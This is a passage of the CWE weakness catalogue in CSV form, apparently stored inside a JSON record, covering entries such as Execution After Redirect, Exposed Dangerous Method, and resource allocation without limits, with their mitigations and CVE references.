overflow.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-0231::REFERENCE:CVE-2008-3282:DESCRIPTION:Size of a particular type changes for 64-bit platforms, leading to an integer truncation in document processor causes incorrect index to be generated.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-3282::\",,,\"::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:FLP34-C:ENTRY NAME:Ensure that floating point conversions are within range of the new type:MAPPING FIT:CWE More Abstract::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:INT15-C:ENTRY NAME:Use intmax_t or uintmax_t for formatted IO on programmer-defined integer types::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:INT31-C:ENTRY NAME:Ensure that integer conversions do not result in lost or misinterpreted data:MAPPING FIT:CWE More Abstract::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:INT35-C:ENTRY NAME:Evaluate integer expressions in a larger size before comparing or assigning to that size::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:NUM12-J:ENTRY NAME:Ensure conversions of numeric types to narrower types do not result in lost or misinterpreted data::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP1:ENTRY NAME:Glitch in computation::TAXONOMY NAME:OMG ASCSM:ENTRY ID:ASCSM-CWE-681::\",,\"\",\n694,\"Use of Multiple Resources with Duplicate Identifier\",Base,Incomplete,\"The product uses multiple resources that can have the same identifier, in a context in which unique identifiers are required.\",\"If the product assumes that each resource has a unique identifier, the product could operate on the wrong resource if attackers can cause multiple resources to be associated with the same identifier.\",::NATURE:ChildOf:CWE ID:99:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:573:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Access Control:IMPACT:Bypass Protection Mechanism:NOTE:If unique identifiers are assumed when protecting sensitive resources, then duplicate identifiers might allow attackers to bypass the protection.::SCOPE:Other:IMPACT:Quality Degradation::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:Where possible, use unique identifiers. If non-unique identifiers are detected, then do not operate any resource with a non-unique identifier and report the error appropriately.::\",\"::REFERENCE:CVE-2013-4787:DESCRIPTION:chain: mobile OS verifies cryptographic signature of file in an archive, but then installs a different file with the same name that is also listed in the archive.:LINK:https://www.cve.org/CVERecord?id=CVE-2013-4787::\",,,\"\",,\"::TYPE:Relationship:NOTE:This weakness is probably closely associated with other issues related to doubling, such as CWE-675 (Duplicate Operations on Resource). It's often a case of an API contract violation (CWE-227).::\",\n695,\"Use of Low-Level Functionality\",Base,Incomplete,\"The product uses low-level functionality that is explicitly prohibited by the framework or specification under which the product is supposed to operate.\",\"The use of low-level functionality can violate the specification in unexpected ways that effectively disable built-in protection mechanisms, introduce exploitable inconsistencies, or otherwise expose the functionality to attack.\",::NATURE:ChildOf:CWE ID:573:VIEW ID:1000:ORDINAL:Primary::,\"\",,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Other:IMPACT:Other::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"\",\"\",,,\"\",::36::,\"\",\n698,\"Execution After Redirect (EAR)\",Base,Incomplete,\"The web application sends a redirect to another location, but instead of exiting, it executes additional code.\",\"\",::NATURE:ChildOf:CWE ID:705:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:670:VIEW ID:1000::,\"::ORDINALITY:Primary::\",,\"\",\"::TERM:Redirect Without Exit::\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Other:SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:IMPACT:Alter Execution Logic:IMPACT:Execute Unauthorized Code or Commands:NOTE:This weakness could affect the control flow of the application and allow execution of untrusted code.::\",\"::METHOD:Black Box:DESCRIPTION:This issue might not be detected if testing is performed using a web browser, because the browser might obey the redirect and move the user to a different page before the application has produced outputs that indicate something is amiss.::\",\"\",\"::REFERENCE:CVE-2013-1402:DESCRIPTION:Execution-after-redirect allows access to application configuration details.:LINK:https://www.cve.org/CVERecord?id=CVE-2013-1402::REFERENCE:CVE-2009-1936:DESCRIPTION:chain: library file sends a redirect if it is directly requested but continues to execute, allowing remote file inclusion and path traversal.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-1936::REFERENCE:CVE-2007-2713:DESCRIPTION:Remote attackers can obtain access to administrator functionality through EAR.:LINK:https://www.cve.org/CVERecord?id=CVE-2007-2713::REFERENCE:CVE-2007-4932:DESCRIPTION:Remote attackers can obtain access to administrator functionality through EAR.:LINK:https://www.cve.org/CVERecord?id=CVE-2007-4932::REFERENCE:CVE-2007-5578:DESCRIPTION:Bypass of authentication step through EAR.:LINK:https://www.cve.org/CVERecord?id=CVE-2007-5578::REFERENCE:CVE-2007-2713:DESCRIPTION:Chain: Execution after redirect triggers eval injection.:LINK:https://www.cve.org/CVERecord?id=CVE-2007-2713::REFERENCE:CVE-2007-6652:DESCRIPTION:chain: execution after redirect allows non-administrator to perform static code injection.:LINK:https://www.cve.org/CVERecord?id=CVE-2007-6652::\",,,\"\",,\"\",\n708,\"Incorrect Ownership Assignment\",Base,Incomplete,\"The product assigns an owner to a resource, but the owner is outside of the intended control sphere.\",\"This may allow the resource to be manipulated by actors outside of the intended control sphere.\",::NATURE:ChildOf:CWE ID:282:VIEW ID:1000:ORDINAL:Primary::NATURE:CanAlsoBe:CWE ID:345:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::PHASE:Operation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Read Application Data:IMPACT:Modify Application Data:NOTE:An attacker could read and modify data for which they do not have permissions to access directly.::\",\"\",\"::PHASE:Policy:DESCRIPTION:Periodically review the privileges and their owners.::PHASE:Testing:DESCRIPTION:Use automated tools to check for privilege settings.::\",\"::REFERENCE:CVE-2007-5101:DESCRIPTION:File system sets wrong ownership and group when creating a new file.:LINK:https://www.cve.org/CVERecord?id=CVE-2007-5101::REFERENCE:CVE-2007-4238:DESCRIPTION:OS installs program with bin owner/group, allowing modification.:LINK:https://www.cve.org/CVERecord?id=CVE-2007-4238::REFERENCE:CVE-2007-1716:DESCRIPTION:Manager does not properly restore ownership of a reusable resource when a user logs out, allowing privilege escalation.:LINK:https://www.cve.org/CVERecord?id=CVE-2007-1716::REFERENCE:CVE-2005-3148:DESCRIPTION:Backup software restores symbolic links with incorrect uid/gid.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-3148::REFERENCE:CVE-2005-1064:DESCRIPTION:Product changes the ownership of files that a symlink points to, instead of the symlink itself.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1064::REFERENCE:CVE-2011-1551:DESCRIPTION:Component assigns ownership of sensitive directory tree to a user account, which can be leveraged to perform privileged operations.:LINK:https://www.cve.org/CVERecord?id=CVE-2011-1551::\",,,\"\",,\"::TYPE:Maintenance:NOTE:This overlaps verification errors, permissions, and privileges. A closely related weakness is the incorrect assignment of groups to a resource. It is not clear whether it would fall under this entry or require a different entry.::\",\n733,\"Compiler Optimization Removal or Modification of Security-critical Code\",Base,Incomplete,\"The developer builds a security-critical protection mechanism into the software, but the compiler optimizes the program such that the mechanism is removed or modified.\",\"\",::NATURE:ChildOf:CWE ID:1038:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE NAME:C:LANGUAGE PREVALENCE:Often::LANGUAGE NAME:C++:LANGUAGE PREVALENCE:Often::LANGUAGE CLASS:Compiled:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"\",\"\",,\"::SCOPE:Access Control:SCOPE:Other:IMPACT:Bypass Protection Mechanism:IMPACT:Other::\",\"::METHOD:Black Box:DESCRIPTION:This specific weakness is impossible to detect using black box methods. While an analyst could examine memory to see that it has not been scrubbed, an analysis of the executable would not be successful. This is because the compiler has already removed the relevant code. Only the source code shows whether the programmer intended to clear the memory or not, so this weakness is indistinguishable from others.::METHOD:White Box:DESCRIPTION:This weakness is only detectable using white box methods (see black box detection factor). Careful analysis is required to determine if the code is likely to be removed by the compiler.::\",\"\",\"::REFERENCE:CVE-2008-1685:DESCRIPTION:C compiler optimization, as allowed by specifications, removes code that is used to perform checks to detect integer overflows.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-1685::REFERENCE:CVE-2019-1010006:DESCRIPTION:Chain: compiler optimization (CWE-733) removes or modifies code used to detect integer overflow (CWE-190), allowing out-of-bounds write (CWE-787).:LINK:https://www.cve.org/CVERecord?id=CVE-2019-1010006::\",,,\"\",::10::24::46::8::9::,\"\",\n749,\"Exposed Dangerous Method or Function\",Base,Incomplete,\"The product provides an Applications Programming Interface (API) or similar interface for interaction with external actors, but the interface includes a dangerous method or function that is not properly restricted.\",\"This weakness can lead to a wide variety of resultant weaknesses, depending on the behavior of the exposed method. It can apply to any number of technologies and approaches, such as ActiveX controls, Java functions, IOCTLs, and so on. The exposure can occur in a few different ways: The function/method was never intended to be exposed to outside actors. The function/method was only intended to be accessible to a limited set of actors, such as Internet-based access from a single web site.\",::NATURE:ChildOf:CWE ID:284:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Primary::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:SCOPE:Confidentiality:SCOPE:Availability:SCOPE:Access Control:SCOPE:Other:IMPACT:Gain Privileges or Assume Identity:IMPACT:Read Application Data:IMPACT:Modify Application Data:IMPACT:Execute Unauthorized Code or Commands:IMPACT:Other:NOTE:Exposing critical functionality essentially provides an attacker with the privilege level of the exposed functionality. This could result in the modification or exposure of sensitive data or possibly even execution of arbitrary code.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design:DESCRIPTION:If you must expose a method, make sure to perform input validation on all arguments, limit access to authorized parties, and protect against all possible vulnerabilities.::PHASE:Architecture and Design Implementation:STRATEGY:Attack Surface Reduction:DESCRIPTION:Identify all exposed functionality. Explicitly list all functionality that must be exposed to some user or set of users. Identify which functionality may be: accessible to all users restricted to a small set of privileged users prevented from being directly accessible at all Ensure that the implemented code follows these expectations. This includes setting the appropriate access modifiers where applicable (public, private, protected, etc.) or not marking ActiveX controls safe-for-scripting.::\",\"::REFERENCE:CVE-2007-6382:DESCRIPTION:arbitrary Java code execution via exposed method:LINK:https://www.cve.org/CVERecord?id=CVE-2007-6382::REFERENCE:CVE-2007-1112:DESCRIPTION:security tool ActiveX control allows download or upload of files:LINK:https://www.cve.org/CVERecord?id=CVE-2007-1112::\",,,\"\",::500::,\"::TYPE:Research Gap:NOTE:Under-reported and under-studied. This weakness could appear in any technology, language, or framework that allows the programmer to provide a functional interface to external parties, but it is not heavily reported. In 2007, CVE began showing a notable increase in reports of exposed method vulnerabilities in ActiveX applications, as well as IOCTL access to OS-level resources. These weaknesses have been documented for Java applications in various secure programming sources, but there are few reports in CVE, which suggests limited awareness in most parts of the vulnerability research community.::\","
  },
  "doc-9290bead89450fdcf844e9d97972aa1f": {
    "content": "CWE-ID,Name,Weakness Abstraction,Status,Description,Extended Description,Related Weaknesses,Weakness Ordinalities,Applicable Platforms,Background Details,Alternate Terms,Modes Of Introduction,Exploitation Factors,Likelihood of Exploit,Common Consequences,Detection Methods,Potential Mitigations,Observed Examples,Functional Areas,Affected Resources,Taxonomy Mappings,Related Attack Patterns,Notes\n756,\"Missing Custom Error Page\",Base,Incomplete,\"The product does not return custom error pages to the user, possibly exposing sensitive information.\",\"\",::NATURE:ChildOf:CWE ID:755:VIEW ID:1000:ORDINAL:Primary::NATURE:CanPrecede:CWE ID:209:VIEW ID:1000::,\"\",,\"\",\"\",\"\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Application Data:NOTE:Attackers can leverage the additional information provided by a default error page to mount attacks targeted on the framework, database, or other resources used by the application.::\",\"\",\"\",\"\",,,\"\",,\"\",\n763,\"Release of Invalid Pointer or Reference\",Base,Incomplete,\"The product attempts to return a memory resource to the system, but it calls the wrong release function or calls the appropriate release function incorrectly.\",\"This weakness can take several forms, such as: The memory was allocated, explicitly or implicitly, via one memory management method and deallocated using a different, non-compatible function (CWE-762). The function calls or memory management routines chosen are appropriate, however they are used incorrectly, such as in CWE-761.\",::NATURE:ChildOf:CWE ID:404:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:404:VIEW ID:1003:ORDINAL:Primary::NATURE:ChildOf:CWE ID:404:VIEW ID:1340:ORDINAL:Primary::,\"\",,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:SCOPE:Availability:SCOPE:Confidentiality:IMPACT:Modify Memory:IMPACT:DoS: Crash, Exit, or Restart:IMPACT:Execute Unauthorized Code or Commands:NOTE:This weakness may result in the corruption of memory, and perhaps instructions, possibly leading to a crash. If the corrupted memory can be effectively controlled, it may be possible to execute arbitrary code.::\",\"::METHOD:Fuzzing:DESCRIPTION:Fuzz testing (fuzzing) is a powerful technique for generating large numbers of diverse inputs - either randomly or algorithmically - and dynamically invoking the code with those inputs. Even with random inputs, it is often capable of generating unexpected results such as crashes, memory corruption, or resource consumption. Fuzzing effectively produces repeatable test cases that clearly indicate bugs, which helps developers to diagnose the issues.:EFFECTIVENESS:High::\",\"::PHASE:Implementation:DESCRIPTION:Only call matching memory management functions. Do not mix and match routines. For example, when you allocate a buffer with malloc(), dispose of the original pointer with free().::PHASE:Implementation:DESCRIPTION:When programming in C++, consider using smart pointers provided by the boost library to help correctly and consistently manage memory.::PHASE:Architecture and Design:STRATEGY:Libraries or Frameworks:DESCRIPTION:Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid. For example, glibc in Linux provides protection against free of invalid pointers.::PHASE:Architecture and Design:DESCRIPTION:Use a language that provides abstractions for memory allocation and deallocation.::PHASE:Testing:DESCRIPTION:Use a tool that dynamically detects memory management problems, such as valgrind.::\",\"::REFERENCE:CVE-2019-11930:DESCRIPTION:function internally calls 'calloc' and returns a pointer at an index... inside the allocated buffer. This led to freeing invalid memory.:LINK:https://www.cve.org/CVERecord?id=CVE-2019-11930::\",,::Memory::,\"::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP12:ENTRY NAME:Faulty Memory Release::\",,\"::TYPE:Maintenance:NOTE:The view-1000 subtree that is associated with this weakness needs additional work. Several entries will likely be created in this branch. Currently the focus is on free() of memory, but delete and other related release routines may require the creation of intermediate entries that are not specific to a particular function. In addition, the role of other types of invalid pointers, such as an expired pointer, i.e. CWE-415 Double Free and release of uninitialized pointers, related to CWE-457.::\",\n770,\"Allocation of Resources Without Limits or Throttling\",Base,Incomplete,\"The product allocates a reusable resource or group of resources on behalf of an actor without imposing any restrictions on the size or number of resources that can be allocated, in violation of the intended security policy for that actor.\",\"Code frequently has to work with limited resources, so programmers must be careful to ensure that resources are not consumed too quickly, or too easily. Without use of quotas, resource limits, or other protection mechanisms, it can be easy for an attacker to consume many resources by rapidly making many requests, or causing larger resources to be used than is needed. When too many resources are allocated, or if a single resource is too large, then it can prevent the code from working correctly, possibly leading to a denial of service.\",::NATURE:ChildOf:CWE ID:400:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:665:VIEW ID:1000::NATURE:ChildOf:CWE ID:400:VIEW ID:1003:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Often::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.::PHASE:Implementation::PHASE:Operation::PHASE:System Configuration::\",\"\",,\"::SCOPE:Availability:IMPACT:DoS: Resource Consumption (CPU):IMPACT:DoS: Resource Consumption (Memory):IMPACT:DoS: Resource Consumption (Other):NOTE:When allocating resources without limits, an attacker could prevent other systems, applications, or processes from accessing the same type of resource.::\",\"::METHOD:Manual Static Analysis:DESCRIPTION:Manual static analysis can be useful for finding this weakness, but it might not achieve desired code coverage within limited time constraints. If denial-of-service is not considered a significant risk, or if there is strong emphasis on consequences such as code execution, then manual analysis may not focus on this weakness at all.::METHOD:Fuzzing:DESCRIPTION:While fuzzing is typically geared toward finding low-level implementation bugs, it can inadvertently find uncontrolled resource allocation problems. This can occur when the fuzzer generates a large number of test cases but does not restart the targeted product in between test cases. If an individual test case produces a crash, but it does not do so reliably, then an inability to limit resource allocation may be the cause. When the allocation is directly affected by numeric inputs, then fuzzing may produce indications of this weakness.:EFFECTIVENESS:Opportunistic::METHOD:Automated Dynamic Analysis:DESCRIPTION:Certain automated dynamic analysis techniques may be effective in producing side effects of uncontrolled resource allocation problems, especially with resources such as processes, memory, and connections. The technique may involve generating a large number of requests to the product within a short time frame. Manual analysis is likely required to interpret the results.::METHOD:Automated Static Analysis:DESCRIPTION:Specialized configuration or tuning may be required to train automated tools to recognize this weakness. Automated static analysis typically has limited utility in recognizing unlimited allocation problems, except for the missing release of program-independent system resources such as files, sockets, and processes, or unchecked arguments to memory. For system resources, automated static analysis may be able to detect circumstances in which resources are not released after they have expired, or if too much of a resource is requested at once, as can occur with memory. Automated analysis of configuration files may be able to detect settings that do not specify a maximum value. Automated static analysis tools will not be appropriate for detecting exhaustion of custom resources, such as an intended security policy in which a bulletin board user is only allowed to make a limited number of posts per day.::\",\"::PHASE:Requirements:DESCRIPTION:Clearly specify the minimum and maximum expectations for capabilities, and dictate which behaviors are acceptable when resource allocation reaches limits.::PHASE:Architecture and Design:DESCRIPTION:Limit the amount of resources that are accessible to unprivileged users. Set per-user limits for resources. Allow the system administrator to define these limits. Be careful to avoid CWE-410.::PHASE:Architecture and Design:DESCRIPTION:Design throttling mechanisms into the system architecture. The best protection is to limit the amount of resources that an unauthorized user can cause to be expended. A strong authentication and access control model will help prevent such attacks from occurring in the first place, and it will help the administrator to identify who is committing the abuse. The login application should be protected against DoS attacks as much as possible. Limiting the database access, perhaps by caching result sets, can help minimize the resources expended. To further limit the potential for a DoS attack, consider tracking the rate of requests received from users and blocking requests that exceed a defined rate threshold.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.::PHASE:Architecture and Design:DESCRIPTION:For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.::PHASE:Architecture and Design:DESCRIPTION:Mitigation of resource exhaustion attacks requires that the target system either: recognizes the attack and denies that user further access for a given amount of time, typically by using increasing time delays uniformly throttles all requests in order to make it more difficult to consume resources more quickly than they can again be freed. The first of these solutions is an issue in itself though, since it may allow attackers to prevent the use of the system by a particular valid user. If the attacker impersonates the valid user, they may be able to prevent the user from accessing the server in question. The second solution can be difficult to effectively institute -- and even when properly done, it does not provide a full solution. It simply requires more resources on the part of the attacker.::PHASE:Architecture and Design:DESCRIPTION:Ensure that protocols have specific limits of scale placed on them.::PHASE:Architecture and Design Implementation:DESCRIPTION:If the program must fail, ensure that it fails gracefully (fails closed). There may be a temptation to simply let the program fail poorly in cases such as low memory conditions, but an attacker may be able to assert control before the software has fully exited. Alternately, an uncontrolled failure could cause cascading problems with other downstream components; for example, the program could send a signal to a downstream process so the process immediately knows that a problem has occurred and has a better chance of recovery. Ensure that all failures in resource allocation place the system into a safe posture.::PHASE:Operation Architecture and Design:STRATEGY:Resource Limitation:DESCRIPTION:Use resource-limiting settings provided by the operating system or environment. For example, when managing system resources in POSIX, setrlimit() can be used to set limits for certain types of resources, and getrlimit() can determine how many resources are available. However, these functions are not available on all operating systems. When the current levels get close to the maximum that is defined for the application (see CWE-770), then limit the allocation of further resources to privileged users; alternately, begin releasing resources for less-privileged users. While this mitigation may protect the system from attack, it will not necessarily stop attackers from adversely impacting other users. Ensure that the application performs the appropriate error checks and error handling in case resources become unavailable (CWE-703).::\",\"::REFERENCE:CVE-2022-21668:DESCRIPTION:Chain: Python library does not limit the resources used to process images that specify a very large number of bands (CWE-1284), leading to excessive memory consumption (CWE-789) or an integer overflow (CWE-190).:LINK:https://www.cve.org/CVERecord?id=CVE-2022-21668::REFERENCE:CVE-2009-4017:DESCRIPTION:Language interpreter does not restrict the number of temporary files being created when handling a MIME request with a large number of parts..:LINK:https://www.cve.org/CVERecord?id=CVE-2009-4017::REFERENCE:CVE-2009-2726:DESCRIPTION:Driver does not use a maximum width when invoking sscanf style functions, causing stack consumption.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-2726::REFERENCE:CVE-2009-2540:DESCRIPTION:Large integer value for a length property in an object causes a large amount of memory allocation.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-2540::REFERENCE:CVE-2009-2054:DESCRIPTION:Product allows exhaustion of file descriptors when processing a large number of TCP packets.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-2054::REFERENCE:CVE-2008-5180:DESCRIPTION:Communication product allows memory consumption with a large number of SIP requests, which cause many sessions to be created.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-5180::REFERENCE:CVE-2008-1700:DESCRIPTION:Product allows attackers to cause a denial of service via a large number of directives, each of which opens a separate window.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-1700::REFERENCE:CVE-2005-4650:DESCRIPTION:CMS does not restrict the number of searches that can occur simultaneously, leading to resource exhaustion.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-4650::REFERENCE:CVE-2020-15100:DESCRIPTION:web application scanner attempts to read an excessively large file created by a user, causing process termination:LINK:https://www.cve.org/CVERecord?id=CVE-2020-15100::REFERENCE:CVE-2020-7218:DESCRIPTION:Go-based workload orchestrator does not limit resource usage with unauthenticated connections, allowing a DoS by flooding the service:LINK:https://www.cve.org/CVERecord?id=CVE-2020-7218::\",,,\"::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:FIO04-J:ENTRY NAME:Close resources when they are no longer needed::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:SER12-J:ENTRY NAME:Avoid memory and resource leaks during serialization::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:MSC05-J:ENTRY NAME:Do not exhaust heap space::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-2:ENTRY NAME:Req CR 7.2::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-2:ENTRY NAME:Req CR 2.7::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-1:ENTRY NAME:Req SI-1::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-1:ENTRY NAME:Req SI-2::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 3-3:ENTRY NAME:Req SR 7.2::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 3-3:ENTRY NAME:Req SR 2.7::\",::125::130::147::197::229::230::231::469::482::486::487::488::489::490::491::493::494::495::496::528::,\"::TYPE:Relationship:NOTE:This entry is different from uncontrolled resource consumption (CWE-400) in that there are other weaknesses that are related to inability to control resource consumption, such as holding on to a resource too long after use, or not correctly keeping track of active resources so that they can be managed and released when they are finished (CWE-771).::TYPE:Theoretical:NOTE:Vulnerability theory is largely about how behaviors and resources interact. Resource exhaustion can be regarded as either a consequence or an attack, depending on the perspective. This entry is an attempt to reflect one of the underlying weaknesses that enable these attacks (or consequences) to take place.::\",\n771,\"Missing Reference to Active Allocated Resource\",Base,Incomplete,\"The product does not properly maintain a reference to a resource that has been allocated, which prevents the resource from being reclaimed.\",\"This does not necessarily apply in languages or frameworks that automatically perform garbage collection, since the removal of all references may act as a signal that the resource is ready to be reclaimed.\",::NATURE:ChildOf:CWE ID:400:VIEW ID:1000:ORDINAL:Primary::,\"\",,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Availability:IMPACT:DoS: Resource Consumption (Other):NOTE:An attacker that can influence the allocation of resources that are not properly maintained could deplete the available resource pool and prevent all other processes from accessing the same type of resource.::\",\"\",\"::PHASE:Operation Architecture and Design:STRATEGY:Resource Limitation:DESCRIPTION:Use resource-limiting settings provided by the operating system or environment. For example, when managing system resources in POSIX, setrlimit() can be used to set limits for certain types of resources, and getrlimit() can determine how many resources are available. However, these functions are not available on all operating systems. When the current levels get close to the maximum that is defined for the application (see CWE-770), then limit the allocation of further resources to privileged users; alternately, begin releasing resources for less-privileged users. While this mitigation may protect the system from attack, it will not necessarily stop attackers from adversely impacting other users. Ensure that the application performs the appropriate error checks and error handling in case resources become unavailable (CWE-703).::\",\"\",,,\"::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:FIO42-C:ENTRY NAME:Close files when they are no longer needed:MAPPING FIT:CWE More Abstract::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:MEM31-C:ENTRY NAME:Free dynamically allocated memory when no longer needed:MAPPING FIT:CWE More Abstract::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP14:ENTRY NAME:Failure to Release Resource::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 3-3:ENTRY NAME:Req SR 7.2::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-1:ENTRY NAME:Req SVV-1::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-2:ENTRY NAME:Req CR 7.2::\",,\"\",\n772,\"Missing Release of Resource after Effective Lifetime\",Base,Draft,\"The product does not release a resource after its effective lifetime has ended, i.e., after the resource is no longer needed.\",\"When a resource is not released after use, it can allow attackers to cause a denial of service by causing the allocation of resources without triggering their release. Frequently-affected resources include memory, CPU, disk space, power or battery, etc.\",::NATURE:ChildOf:CWE ID:404:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:404:VIEW ID:1003:ORDINAL:Primary::NATURE:ChildOf:CWE ID:404:VIEW ID:1305:ORDINAL:Primary::NATURE:ChildOf:CWE ID:404:VIEW ID:1340:ORDINAL:Primary::,\"\",::TECHNOLOGY CLASS:Mobile:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Availability:IMPACT:DoS: Resource Consumption (Other):NOTE:An attacker that can influence the allocation of resources that are not properly released could deplete the available resource pool and prevent all other processes from accessing the same type of resource.::\",\"\",\"::PHASE:Requirements:STRATEGY:Language Selection:DESCRIPTION:Use a language that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid. For example, languages such as Java, Ruby, and Lisp perform automatic garbage collection that releases memory for objects that have been deallocated.::PHASE:Implementation:DESCRIPTION:It is good practice to be responsible for freeing all resources you allocate and to be consistent with how and where you free resources in a function. If you allocate resources that you intend to free upon completion of the function, you must be sure to free the resources at all exit points for that function including error conditions.::PHASE:Operation Architecture and Design:STRATEGY:Resource Limitation:DESCRIPTION:Use resource-limiting settings provided by the operating system or environment. For example, when managing system resources in POSIX, setrlimit() can be used to set limits for certain types of resources, and getrlimit() can determine how many resources are available. However, these functions are not available on all operating systems. When the current levels get close to the maximum that is defined for the application (see CWE-770), then limit the allocation of further resources to privileged users; alternately, begin releasing resources for less-privileged users. While this mitigation may protect the system from attack, it will not necessarily stop attackers from adversely impacting other users. Ensure that the application performs the appropriate error checks and error handling in case resources become unavailable (CWE-703).::\",\"::REFERENCE:CVE-2007-0897:DESCRIPTION:Chain: anti-virus product encounters a malformed file but returns from a function without closing a file descriptor (CWE-775) leading to file descriptor consumption (CWE-400) and failed scans.:LINK:https://www.cve.org/CVERecord?id=CVE-2007-0897::REFERENCE:CVE-2001-0830:DESCRIPTION:Sockets not properly closed when attacker repeatedly connects and disconnects from server.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0830::REFERENCE:CVE-1999-1127:DESCRIPTION:Does not shut down named pipe connections if malformed data is sent.:LINK:https://www.cve.org/CVERecord?id=CVE-1999-1127::REFERENCE:CVE-2009-2858:DESCRIPTION:Chain: memory leak (CWE-404) leads to resource exhaustion.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-2858::REFERENCE:CVE-2009-2054:DESCRIPTION:Product allows exhaustion of file descriptors when processing a large number of TCP packets.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-2054::REFERENCE:CVE-2008-2122:DESCRIPTION:Port scan triggers CPU consumption with processes that attempt 